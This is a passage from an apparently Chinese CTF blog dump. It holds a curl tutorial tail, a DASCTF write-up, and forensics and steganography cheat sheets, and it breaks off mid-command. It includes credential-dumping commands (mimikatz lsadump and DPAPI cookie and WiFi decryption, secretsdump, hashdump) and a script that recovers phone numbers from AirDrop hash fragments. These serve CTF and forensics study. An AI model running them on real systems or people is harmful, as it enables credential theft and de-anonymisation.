使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。 --data-urlencode --data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。 1$ curl --data-urlencode &#x27;comment=hello world&#x27; https://google.com/login 上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。 -e -e参数用来设置 HTTP 的标头Referer，表示请求的来源。 1curl -e &#x27;https://google.com?q=example&#x27; https://www.example.com 上面命令将Referer标头设为https://google.com?q=example。 -G -G参数用来构造 URL 的查询字符串。 1$ curl -G -d &#x27;q=kitties&#x27; -d &#x27;count=20&#x27; https://google.com/search 上面命令会发出一个 GET 请求，实际请求的 URL 为https://google.com/search?q=kitties&amp;count=20。如果省略--G，会发出一个 POST 请求。 如果数据需要 URL 编码，可以结合--data--urlencode参数。 1$ curl -G --data-urlencode &#x27;comment=hello world&#x27; https://www.example.com -H -H参数添加 HTTP 请求的标头。 1$ curl -H &#x27;Accept-Language: en-US&#x27; https://google.com 上面命令添加 HTTP 标头Accept-Language: en-US。 1$ curl -H &#x27;Accept-Language: en-US&#x27; -H &#x27;Secret-Message: xyzzy&#x27; https://google.com 上面命令添加两个 HTTP 标头。 1$ curl -d &#x27;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#x27; -H &#x27;Content-Type: application/json&#x27; https://google.com/login 上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。 1$ curl -H &#x27;User-Agent: php/1.0&#x27; https://google.com 上面命令通过-H参数直接指定标头，更改User-Agent。 1$ curl -H &#x27;Referer: https://google.com?q=example&#x27; https://www.example.com 上面命令通过直接添加标头Referer，达到同样效果。 1$ curl -H &#x27;Host: xxxx&#x27; https://www.example.com 上面命令设置Host绕过主机头检测，替代更改host文件的繁琐操作。 1$ curl -H &#x27;Content-Type:application/json&#x27; https://www.example.com 上面命令设置请求头Content-Type，以json格式发送。 1$ curl -H &#x27;Range: bytes=0-10&#x27; https://www.example.com 上面命令请求资源的部分内容（不包括响应头的大小），单位是byte，即字节，从0开始。 格式： Range: bytes=start-end 如： Range: bytes=10- ：第10个字节到最后一个字节之间的数据 Range: bytes=40-100 ：第40个字节到第100个字节之间的数据 -i -i参数打印出服务器回应的 HTTP 标头。 1$ curl -i https://www.example.com 上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。 -L -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。 1$ curl -L -d &#x27;tweet=hi&#x27; https://api.twitter.com/tweet -o -o参数将服务器的回应保存成文件，等同于wget命令。 1$ curl -o example.html https://www.example.com 上面命令将www.example.com保存成example.html。 -O -O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。 1$ curl -O https://www.example.com/foo/bar.html 上面命令将服务器回应保存成文件，文件名为bar.html。 -u -u参数用来设置服务器认证的用户名和密码。 1$ curl -u &#x27;bob:12345&#x27; https://google.com/login 上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。 curl 能够识别 URL 里面的用户名和密码。 1$ curl https://bob:12345@google.com/login 上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。 1$ curl -u &#x27;bob&#x27; https://google.com/login 上面命令只设置了用户名，执行后，curl 会提示用户输入密码。 -v -v参数输出通信的整个过程，用于调试。 1$ curl -v https://www.example.com -F 或 --form 使用-F 或 --form来上传文件，这样会给请求添加 enctype=&quot;multipart/form-data&quot; 参数。 1$ curl -F &#x27;img_avatar=@/home/petehouston/hello.txt&#x27; http://localhost/upload 想要同时上传多个文件的话，只需要添加多个 -F 选项就可以了。 1$ curl -F &#x27;fileX=@/path/to/fileX&#x27; -F &#x27;fileY=@/path/to/fileY&#x27; ... http://localhost/upload 想要上传文件数组的话，只需要添加多个 -F 选项并命名成相同名字的数组就可以了。 1$ curl -F &#x27;files[]=@/path/to/fileX&#x27; -F &#x27;files[]=@/path/to/fileY&#x27; ... http://localhost/upload -x -x参数指定 HTTP 请求的代理。 1$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com 上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。 如果没有指定代理协议，默认为 HTTP。 1$ curl -x james:cats@myproxy.com:8080 https://www.example.com 上面命令中，请求的代理使用 HTTP 协议。","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"命令行","slug":"命令行","permalink":"https://lazzzaro.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Linux","slug":"Linux","permalink":"https://lazzzaro.github.io/tags/Linux/"},{"name":"Bash","slug":"Bash","permalink":"https://lazzzaro.github.io/tags/Bash/"}],"author":"Lazzaro"},{"title":"DASCTF 六月团队赛","slug":"match-DASCTF-六月团队赛","date":"2020-06-26T10:43:38.000Z","updated":"2020-06-27T02:39:25.461Z","comments":true,"path":"2020/06/26/match-DASCTF-六月团队赛/","permalink":"https://lazzzaro.github.io/2020/06/26/match-DASCTF-%E5%85%AD%E6%9C%88%E5%9B%A2%E9%98%9F%E8%B5%9B/","excerpt":"","text":"​ 没有web手+pwn手伤不起~~ ​ MISCPhysicalHacker 提交flag时请提交{}里面的 已知数据包文件DASCTF_June.cap和hint.txt 由hint.txt脚本知某个密码使用的字典为00000000-99999999（10个值）。 Wireshark打开cap文件，发现里面只有802.11 wireless LAN协议流量，很有可能是WPA或WEP加密后的无线数据包。 Kali下使用工具 aircrack-ng + airdecap-ng 破解： aircrack-ng DASCTF_June.cap 查看ESSID信息 aircrack-ng DASCTF_June.cap -w password.txt 用上面的字典爆破密码 得到密码 66666666，用ESSID和密码解密流量包 airdecap-ng DASCTF_June.cap -e DASCTF -p 66666666 得到新流量包，打开查看TCP数据包，在一个包中找到zip文件数据，导出解压得到flag.txt。 只有一句话“Welcome to DASCTF June, Flag is here but you will never find it noob hacker!” 但Ctrl+A全选发现下方有大量空白不可见字符，猜测为snow隐写， 使用snow隐写工具解密： snow.exe -d flag.txt 得到字符串base32解码即可。 ​ BaiduYun&amp;Gcode 你了解百度网盘的秒传原理么？ hint:数据库中的xshadow.png与平台首页中xshadow.png的前256KB相同 已知一份百度云盘的用户数据文件夹users。这题出得不错，了解百度网盘的秒传原理。 秒传原理：通过检测文件大小和md5值，或者再加上其他如文件前256KB切片的md5值的信息，若云端有相同的文件，则直接进行云端拷贝。 参考： 利用BaiduPCS-Go批量秒传与备份 https://github.com/felixonmars/BaiduPCS-Go 下载BaiduPCS-Go工具，验证自己的百度云账号密码登录。 从users提取 BaiduYunCacheFileV0.db 中的数据库信息，用SQLite Expert查看器打开db文件，找到cache数据记录： 由提示肯定是和xshadow.png有关了，用BaiduPCS-Go工具里的手动秒传功能 BaiduPCS-Go ru -length=&lt;文件的大小&gt; -md5=&lt;文件的md5值&gt; -slicemd5=&lt;文件前256KB切片的md5值(可选)&gt; -crc32=&lt;文件的crc32值(可选)&gt; &lt;保存的网盘路径, 需包含文件名&gt; 放入得到的xshadow.png信息： BaiduPCS-Go ru -length=30038207 -md5=72b6273dc5c54e8af2490e4acd3a6a3f /temp 发现运行不成功，需要slicemd5值，那么需要 xshadow.png 的前256KB切片的md5了。 根据提示，在首页找到 https://www.linkedbyx.com/static/xshadow.png 下载，kali下取前256KB切片。 split -b 256K xshadow.png 生成文件xaa md5sum xaa 求切片md5值 重新运行命令： BaiduPCS-Go ru -length=30038207 -md5=72b6273dc5c54e8af2490e4acd3a6a3f -slicemd5=e973409c4ac718e158be4492ab5d9999 /temp 成功在百度网盘得到云上的xshadow.png文件。 下载，用binwalk提取出zip文件，解压得到flag.gcode。 了解到gcode文件为3D模型切片软件输出的文件类型，可以用下面三个任意一个网页在线预览： http://gcode.ws/https://ncviewer.com/http://jherrm.com/gcode-viewer/ 试了很多次在线加载，挂着两个虚拟机，300w+行代码，打开到一半直接内存不足网页崩溃，求助64G大内存神机大佬，在线绘制得到 想到是3D绘制，尝试旋转各视角，在侧面发现玄机，调整好角度记录最终flag。 膜出题大佬~~ ​ Keyboard I hid the flag. Go find it 已知文件Keyboard.raw和Secret，貌似是4月赛原题。 内存取证： volatility -f Keyboard.raw imageinfo 得到profile信息 Win7SP1x64， volatility -f Keyboard.raw --profile=Win7SP1x64 pslist 发现可疑进程 keyboard-log.exe 和 VeraCrypt.exe，分别是键盘记录器和加密器， 搜索 keyboard-log 相关文件 volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard dump导出可疑 t.txt 文件。 CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA 像是密码的密文，加密方法是上面的 CTFWIKI-CRYPTO-ABC， 猜测QWERTY键盘密码，脚本还原得VERACRYPTPASSWORDISKEYBOARDDRAOBYEK。 用VeraCrypt挂载加密分区文件Secret，得到一个vhd虚拟磁盘文件，再挂载得到flag.txt，打开发现为假flag， NTFS隐写工具搜一搜，得到正确flag。 ​ 透明度 你知道RGBA吗？ 已知一张png图，题面RGBA提示LSB隐写，用zsteg工具查看： zsteg -a Rgba.png 发现 b8,a,lsb,xy 区域有zip文件，导出内容： zsteg -E &quot;b8,a,lsb,xy&quot; Rgba.png &gt; out.zip zip内txt文件名提示密码是 nep?? 在ARCHPR中设置掩码爆破得zip密码为：nepnb，解压得flag。 ​ CRYPTOGemini_Man 貌似N很大噢，耐心点总能解出来 已知很大的 $C$ 和 $N$，无法用常规方法分解，由开局的提示”孪生素数“或题目”Gemini_Man“，猜测 $q=p+2$。 代入 $pq=N$，解一元二次方程得到正确 $p,q$ 值。 题目未给 $e$ ，猜测为常见的 $e=65537$ ，常规脚本放到Kali环境跑出明文 $m$。 （未知原因Windows环境下 pow(C,d,N) 死活跑不出） ​ HardKnapsack1 HardKnapsack1 求解背包加密，在Sage中采用LLL算法现成脚本跑出结果： 1234567891011121314151617181920212223242526272829303132333435###Sage###import binascii# open the public key and strip the spaces so we have a decent arrayfileKey = open(&quot;pub.Key&quot;, &#x27;rb&#x27;)pubKey = fileKey.read().replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;L&#x27;, &#x27;&#x27;).strip(&#x27;[]&#x27;).split(&#x27;,&#x27;)nbit = len(pubKey)# open the encoded messagefileEnc = open(&quot;enc.txt&quot;, &#x27;rb&#x27;)encoded = fileEnc.read().replace(&#x27;L&#x27;, &#x27;&#x27;)print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] print(M) PS：带约束条件的HardKnapsack2用LLL跑不出结果，待学习。 ​ REVERSEeasy_maze 走出来便是英雄！ps:将得到的字符串md5加密提交 迷宫题，IDA查看字符串发现迷宫阵字符串： OOOO0000#000OO0OOOOOO0OO0000OO00OOOOO0OO0OOOO000OO00OO00OOOOO0OO0OOOOOO0000OOOOOOOOOOOOOOOOOOOOOOOO 结合main函数伪代码易知上下左右控制键对应ujhk，且迷宫大小为10×10，#为终点，0为路径，X（实际为空）为起点，调整为： XOOOO0000# 000OO0OOOO OO0OO0000O O00OOOOO0O O0OOOO000O O00OO00OOO OO0OO0OOOO OO0000OOOO OOOOOOOOOO OOOOOOOOOO 得到路径字符串：jkkjjhjjkjjkkkuukukkuuhhhuukkkk，md5加密提交。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"取证","slug":"misc-取证","date":"2020-06-19T17:48:32.000Z","updated":"2025-04-19T09:37:20.231Z","comments":true,"path":"2020/06/20/misc-取证/","permalink":"https://lazzzaro.github.io/2020/06/20/misc-%E5%8F%96%E8%AF%81/","excerpt":"","text":"取证（Forensic）常见Linux登录密码/etc/passwd，/etc/shadow + john爆破 (john —format=crypt hash) 定时任务/etc/crontab，/var/log/cron.log 系统名/etc/issue docker容器/var/lib/docker/containers/xxxxxxxxx/config.v2.json Windows软件FoxmailStorage目录+FMStorage.list，复制到本地目录，打开Foxmail Firefoxxxxxxx.default-release目录，key4.db+logins.json，复制到本地目录打开firefox，或firepwd工具 内存取证挂载raw转vmdk qemu-img convert -f raw data.raw -O vmdk output.vmdk Linux 确定操作系统-&gt;VMware新建虚拟机-&gt;稍后安装系统-&gt;选操作系统（Linux）-&gt;选I/O类型（LSI Logic SAS）-&gt;选磁盘类型（SATA）-&gt;使用现有虚拟磁盘-&gt;开机按e修改启动配置-&gt;删掉静默模式以及一堆网卡串口配置，添加rw init=/sysroot/bin/sh-&gt;系统初始化到shell环境 切换根目录： 123mount -o remount rw /sysrootchroot /sysrootLANG=C 改root密码： 1234touch /.autorelabelpasswdexitreboot volatilityhttps://github.com/volatilityfoundation/volatility 镜像基本信息（得到profile）： volatility -f mem.data imageinfo python3 vol.py -f mem.data windows.info 搜索进程、导出内存块： volatility -f mem.data --profile=XXX pslist python3 vol.py -f mem.data windows.pstree volatility -f mem.data --profile=XXX memdump -p 2768 -D ./ 查看命令行输入、命令行历史记录： volatility -f mem.data --profile=XXX cmdline python3 vol.py -f mem.data windows.cmdline volatility -f mem.data --profile=XXX cmdscan volatility -f mem.data --profile=XXX consoles 查看可疑文件、导出文件（如无法导出vol2换vol3）： volatility -f mem.data --profile=XXX filescan | grep -E &quot;.zip|.rar|.jpg|.png|.txt|.bmp|.7z&quot; volatility -f mem.data --profile=XXX dumpfiles -D ./ -Q 0x000000001e85f430 -n python3 vol.py -f mem.data windows.filescan | grep -E &#39;flag|elf&#39; python3 vol.py -f mem.data windows.dumpfiles --pid 8180 python3 vol.py -f mem.data windows.dumpfiles --physaddr 0x4181c950 特殊文件后缀： evtx - Windows系统日志 无法导出.dat文件，加 -u 参数（-u = —unsafe relax safety constraints more data）volatility -f mem.data dumpfiles -r pdf$ -i --name -D dumpfiles/ -u dumpfiles 参数：参考：https://www.andreafortuna.org/2017/07/17/volatility-my-own-cheatsheet-part-4-kernel-memory-and-objects12345678910111213141516-r REGEX, --regex=REGEX Dump files matching REGEX-i, --ignore-case Ignore case in pattern match-o OFFSET, --offset=OFFSET Dump files for Process with physical address OFFSET-Q PHYSOFFSET, --physoffset=PHYSOFFSET Dump File Object at physical address PHYSOFFSET-D DUMP_DIR, --dump-dir=DUMP_DIR Directory in which to dump extracted files-S SUMMARY_FILE, --summary-file=SUMMARY_FILE File where to store summary information-p PID, --pid=PID Operate on these Process IDs (comma-separated)-n, --name Include extracted filename in output file path-u, --unsafe Relax safety constraints for more data-F FILTER, --filter=FILTER Filters to apply (comma-separated) 查看内存中记录的当时正在运行的程序、运行次数、最后运行时间、窗口被作为焦点总时间： volatility -f mem.data --profile=XXX userassist 查看截图： volatility -f mem.data --profile=XXX screenshot -D ./ 查看剪贴板： volatility -f mem.data --profile=XXX clipboard volatility -f mem.data --profile=XXX clipboard -v 查看Edit编辑控件信息： volatility -f mem.data --profile=XXX editbox 查看当前notepad文本： volatility -f mem.data --profile=XXX notepad 查看账户与密码： volatility --plugins=plugins/ -f mem.data lsadump volatility --plugins=plugins/ -f mem.data --profile=XXX mimikatz（或PasswareKitForensic） 查看系统计算机名： volatility -f mem.data --profile=XXX printkey -K &quot;ControlSet001\\Control\\ComputerName\\ComputerName&quot;（或PasswareKitForensic） 查看系统用户名： volatility -f mem.data --profile=XXX printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; 查看最后登录系统的账户： volatility -f mem.data --profile=xxx printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; 查看网络连接信息： volatility -f mem.data --profile=XXX netscan 查看用户会话： volatility -f mem.data --profile=XXX sessions 查看缓存在内存中的注册表： volatility -f mem.data --profile=XXX hivelist 提取注册表： volatility -f mem.data --profile=XXX dumpregistry -D ../ （dumpregistry插件） 提取注册表system和SAM虚拟地址的hash内容： volatility -f mem.data --profile=XXX hashdump volatility -f mem.data --profile=XXX hashdump -y 0xfffff8a000024010 -s 0xfffff8a00167a010 -D ./ python3 vol.py -f mem.data windows.hashdump 提取内存中主文件表（MFT）记录信息（文件属性）： volatility -f mem.data --profile=XXX mftparser &gt; mft.txt 提取IE历史记录： volatility -f mem.data --profile=XXX iehistory 显示环境变量： volatility -f mem.data --profile=XXX envars python3 vol.py -f mem.data windows.envars 查看进程的物理偏移： volatility -f mem.data --profile=XXX psxview 查看进程的PoolTag： 参考： https://forensics.xidian.edu.cn/wiki/ram2/ https://medium.com/@sky__/memory-udom-x-m455-ctf-2023-writeup-a97e573f583d volatility -f mem.data --profile=XXX volshell 123dt( &quot;_EPROCESS&quot;,0x000000007fca3820 , space=addrspace().base)dt( &quot;_OBJECT_HEADER&quot;,0x000000007fca3820-0x30 , space=addrspace().base)dt( &quot;_POOL_HEADER&quot; ,0x000000007fca3820-0x30-0x10-0x20, space=addrspace().base) 提取Chrome历史记录（插件）： Chrome Cookies 的本质是 SQLite。 Chrome 80 以后更改了 Cookies 的加密方法。 cookies 表 encrypted_value 字段不为 V10 / V11 开头，是 Chrome 79 及以前版本的 Cookies。 volatility --plugins=plugins/ -f mem.data chromehistory volatility --plugins=plugins/ -f mem.data chromevisits -Q（visits – QUICK） volatility --plugins=plugins/ -f mem.data chromevisits（visits – FULL） volatility --plugins=plugins/ -f mem.data chromesearchterms volatility --plugins=plugins/ -f mem.data chromedownloads（Standard Text Output） volatility --plugins=plugins/ -f mem.data chromedownloads --output=csv（CSV Output） volatility --plugins=plugins/ -f mem.data chromedownloads --output=body（Bodyfile Output） volatility --plugins=plugins/ -f mem.data chromedownloadchains volatility --plugins=plugins/ -f mem.data chromecookies | more（Cookies – Basic example） volatility --plugins=plugins/ -f mem.data chromecookies（Cookies – No Decryption） volatility --plugins=plugins/ -f mem.data chromecookies -K &quot;rq2uadV+VvAD+IBiBeJ75a==&quot;（Cookies – Decrypted） 提取登录密码（LassPass插件）： volatility --plugins=plugins/ -f mem.data --profile=XXX lasspass USB设备相关（usbstor插件）： volatility --plugins=plugins/ -f mem.data --profile=XXX usbstor 特殊进程 便签：StikyNot.exe （.snt 文件，对应路径：C:\\Users\\XXX\\AppData\\Roaming\\Microsoft\\Sticky Notes\\） 联系人：wab.exe （.contact 文件） 插件收集 https://github.com/superponible/volatility-plugins（chromehistory） https://github.com/kevthehermit/volatility_plugins（usbstor） 参考 https://wiki.wgpsec.org/knowledge/ctf/Volatility.html Linux镜像制作Linux内存镜像需要制作相应的profile来进⾏分析。 先查看版本：strings mem | grep &#39;Linux version&#39; 去 Deep Security 12.0 Supported Linux Kernels 上搜索版本号，安装好对应的内核之后就可以开始做profile： 1234sudo apt install build-essential dwarfdumpgit clone https://github.com/volatilityfoundation/volatilitycd volatility/tools/linuxmake 以debian为例，debian新版本的systemmap可以在这里找到。做完profile就可以开始取证。 查看命令行： volatility -f mem --profile=Linuxdebian51021x64 linux_bash 恢复⽂件系统： volatility -f mem --profile=Linuxdebian51021x64 linux_recover_filesystem --dump-dir=../files/ 恢复完毕后，就可以看到相关文件。 参考： 内存取证实验 - 镜像 + 配置文件 0xGame 2023 Week4 - oh-my-linux MemProcFShttps://github.com/ufrisk/MemProcFS 挂载到M盘： MemProcFS.exe -device &quot;mem.dmp&quot; -v -forensic 1 计算机信息：M:\\sys\\sysinfo\\sysinfo.txt ​ 磁盘取证vmdkAccessData FTK Imager 挂载 Bitlocker 磁盘+内存 Elcomsoft Forensic Disk Decryptor volume选择挂载过的物理磁盘，memory dump选择内存文件，一直往后解密。 日志到$Extend---$UsnJrnl---$J，使用NTFS Log Tracker或解析UsnJrnl的工具，加载 $J 文件，然后生成db文件，导出CSV。 ​ 注册表取证文件路径用户名&amp;密码hashWindows/System32/config/SAM Windows/System32/config/SYSTEM Windows/System32/config/SECURITY dump： python secretsdumps.py -sam sam -security security -system system LOCAL john hash.txt --show --format=NT 或： 12privilege::debug //进入特权模式lsadump::sam /system:&quot;E:\\SYSTEM&quot; /sam:&quot;E:\\SAM&quot; 环境变量Users/[AccountName]/NTUSER.DAT 启动项Users/[AccountName]/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup 注册表路径计算机相关注册时设置的用户名： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion，键值 RegisteredOwner 当前操作系统的产品名称： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion，键值 ProductName Firefox浏览器版本号： HKEY_LOCAL_MACHINE\\SOFTWARE\\Mozilla\\Mozilla Firefox，键值 CurrentVersion ​ 社工（信息收集）用户名https://github.com/sherlock-project/sherlock Sherlock Project提供了一个非常强大的命令行工具Sherlock来查找社交网络（社交网络列表及规则可自定义扩展延伸）中的用户名，以方便您进行信息收集相关的安全保障工作。 命令：python3 sherlock.py user1 user2 user3 ​ WiFi参考：How to decrypt stored Windows passwords using mimikatz and DAPA 工具：mimikatz 保存/使用主密钥（master keys）： dpapi::cache /save /file:cache.bin 提取WiFi密码： dpapi::wifi /in:&quot;&#123;fullpath&#125;\\file.xml&quot; ​ Cookies工具：mimikatz 保存/使用主密钥（master keys）： Windows 下：文件夹选项 -&gt; 查看 -&gt; 取消勾选 “隐藏受保护的操作系统文件” 才能看到 SID 文件夹下的 protect 文件 dpapi::masterkey /in:S-1-5-21-262715442-3761430816-2198621988-1001\\57935170- beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:&lt;登录密码&gt; 解密Cookies： dpapi::chrome /in:&quot;Cookies&quot; ​ AirDropAirDrop有一个安全漏洞将发送者的Apple ID和电话号码的哈希值泄露给接收者设备。在AirDrop连接或文件传输之前，发送设备的Apple ID和电话号码的SHA-256哈希值会广播给所有邻近的设备。所以在传输过程中可以捕获该苹果ID和电话号码的部分SHA-256哈希值，爆破出完整的信息以此来识别发送设备。 关键文件：sysdiagnose/system_logs.archive AirDrop AWDL数据存储在日志内的sharingd进程下，因此可以添加过滤条件只显示sharingd进程和Hashes的数据。 投递设备的部分Hash数据（前五位…后五位），可以写脚本爆破国内运营商所有手机号的号段，需要注意的是手机号前面要加上中国的手机号前缀86。 1234567891011121314151617181920212223242526272829import hashlibtargetstart = input(&#x27;[+] Enter the target hash start fragment: &#x27;)targetend = input(&#x27;[+] Enter the target hash end fragment: &#x27;)print(&#x27;[+] Checking all Chinese areacode&#x27;)areacodelist = [&#x27;139&#x27;, &#x27;138&#x27;, &#x27;137&#x27;, &#x27;136&#x27;, &#x27;135&#x27;, &#x27;134&#x27;, &#x27;159&#x27;, &#x27;158&#x27;, &#x27;157&#x27;,&#x27;150&#x27;,&#x27;151&#x27;, &#x27;152&#x27;, &#x27;188&#x27;, &#x27;187&#x27;, &#x27;182&#x27;, &#x27;183&#x27;, &#x27;184&#x27;, &#x27;178&#x27;]phonematch = []for areacode in areacodelist: line = &#x27;0&#x27; print(&#x27;[+] Searching area code &#x27; + areacode + &#x27; for target...&#x27;) while int(line) &lt; 10000000: targetphone = &#x27;86&#x27; + str(areacode) + str(line).zfill(8) targettest = hashlib.sha256(targetphone.encode()) starthashcheck = targettest.hexdigest() [0:5] endhashcheck = targettest.hexdigest() [-5:] if starthashcheck == targetstart.lower() and endhashcheck == targetend.lower(): print(targetphone + &#x27; matches hash fragments. Still checking...&#x27;) phonematch.append(targetphone) line = int(line) + 1 while int(line) == 10000000: break if phonematch: print(&#x27;Your target\\&#x27;s phone number may be:&#x27;) for match in phonematch: print(match)else: print(&#x27;Target phone number not found in this area code set. Target phone may use another country code.&#x27;) ​ 应急响应查看外连： tcpdump -i eth0 not port 22 -nn 查看CPU占用大的进程： ps aux --sort=-%cpu","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://lazzzaro.github.io/tags/%E5%8F%96%E8%AF%81/"}],"author":"Lazzaro"},{"title":"文件隐写","slug":"misc-文件隐写","date":"2020-06-19T17:48:22.000Z","updated":"2025-04-19T09:46:50.250Z","comments":true,"path":"2020/06/20/misc-文件隐写/","permalink":"https://lazzzaro.github.io/2020/06/20/misc-%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99/","excerpt":"","text":"文件隐写（Steganography）文件头：List of file signatures 图片类通用 图种（binwalk、foremost、某压缩软件） LSB stegsolve.jar 安装：http://www.caesum.com/handbook/Stegsolve.jar lsb.py 安装：https://github.com/livz/cloacked-pixel 命令：(python2) lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt; stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.jpg] [wordlist.txt] openstego https://www.openstego.com/ 盲水印（双图） https://github.com/chishaxie/BlindWaterMark 命令：python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png https://github.com/linyacool/blind-watermark 命令：python decode.py --original ori.png --image res.png --result extract.png Java盲水印 https://github.com/ww23/BlindWatermark 命令：java -jar BlindWatermark.jar decode -c img-ec.jpg img-dc.jpg 隐形水印（吾爱破解WaterMark隐形水印工具） NTFS（某压缩软件、NtfsStreamsEditor） Our Secret（文档加密） Steganography https://www.hyluz.cn/zb_users/upload/2021/02/202102201613815645350310.zip 文件尾标志：l&lt;9l0kl10n88j:8&lt; 参考：https://www.hyluz.cn/?id=208 PixelJihad（JS加密） https://github.com/oakes/PixelJihad http://tools.jb51.net/aideddesign/img_add_info Steganography.js（JS加密） https://www.peter-eigenschink.at/projects/steganographyjs/showcase/ DeEgger Embedder bftools 命令： bftools decode braincopter 1.png &gt; 1.txt bftools run 1.txt png文件头：89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82 zsteg https://github.com/zed-0xff/zsteg 命令： zsteg -a xxx.png zsteg -E &quot;[Pattern]&quot; xxx.png &gt; out.xxx LSB（带密码，弱口令123456） https://github.com/livz/cloacked-pixel https://github.com/fjh1997/cloacked-pixel stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) jpg / jpeg文件头：FF D8 FF 文件尾：FF D9 steghide http://steghide.sourceforge.net/ 命令：steghide extract -sf 1.jpg （需密码 或 空密码） 密码爆破： stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.jpg] [wordlist.txt] StegCracker（爆破） https://github.com/Paradoxis/StegCracker 命令：stegcracker &lt;file&gt; [&lt;wordlist&gt;] jsteg https://github.com/lukechampine/jsteg F5 https://github.com/matthewgao/F5-steganography 命令：java Extract 123456.jpg -p 123456 outguess https://github.com/crorvick/outguess 命令：outguess -r file.jpg -k password -t out.txt JPHS https://www.scanwith.com/JPHS_for_Windows_download.htm bmp zsteg https://github.com/zed-0xff/zsteg 命令： zsteg -a xxx.bmp zsteg -E &quot;[Pattern]&quot; xxx.bmp &gt; out.xxx wbStego wbstego43open：http://wbstego.wbailer.com/ stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) gif文件头：47 49 46 38（GIF87a 或 GIF89a） 分帧（NamoGIF） 时间轴（每一帧间的时间间隔） identify -format &quot;%s %T \\n&quot; 100.gif stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) 相同图像比对 webp stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) 其他在线工具StegOnline 在线图片添加/解密隐藏信息(隐写术)工具 Magic Eye Solver / Viewer Aperi’Solve npiet apple图片查看 音频类通用 Audacity（波形、频谱） DeEgger Embedder 提取音频样品数据 1234import librosaaudiofile = &#x27;1.wav&#x27;data, sr = librosa.load(audiofile1, sr=None, dtype=&#x27;float32&#x27;)print(data) mp3 mp3stego https://www.petitcolas.net/steganography/mp3stego/ 命令：decode -X -P pass svega_stego.mp3 MP3 Steno 帧头private_bit 参考： 某工控 CTF 线上赛隐信道数据安全分析题解 De1CTF mc_easybgm wav文件头：52 49 46 46 EE AD 25 03 57 41 56 45 66 6D 74 20 steghide http://steghide.sourceforge.net/ 命令：steghide extract -sf 1.wav （需密码 或 空密码） 密码爆破： stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.wav] [wordlist.txt] LSB Silenteye: https://silenteye.v1kings.io/ 脚本： https://github.com/sniperline047/Audio-Steganography SSTV 慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。 工具： https://github.com/colaclanth/sstv 命令：sstv -d audio_file.wav -o result.png 手机App - Robot36（音频→图片） QSSTV DeepSound stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) mid Velato http://velato.net/ 其他在线工具摩斯密码识别：Morse Code Adaptive Audio Decoder 拨号音识别：Detect DTMF Tones 音频反转：Reverse Audio Online 视频类通用 MSU StegoVideo / VirtualDub+插件 https://zhaokaifeng.com/?p=1305 压缩包类zip文件头：50 4B 03 04（PK） 伪加密（某压缩软件） 密码爆破（ARCHPR） 明文攻击工具 bkcrack / rbkcrack 攻击： 12345678bkcrack -C xxx.zip -c xxx.png -p yyy.png-C 要攻击的压缩包-c 要攻击的压缩包里面的文件-p 刚创建的明文文件名*部分位置已知明文：bkcrack -C flag.zip -c flag.txt -p plain.txt -x 16 2d -x 21 2d -x 26 2d -x 31 2d -x 44 7d 得到三个key解码： 1234567891011#获取密码bkcrack -k 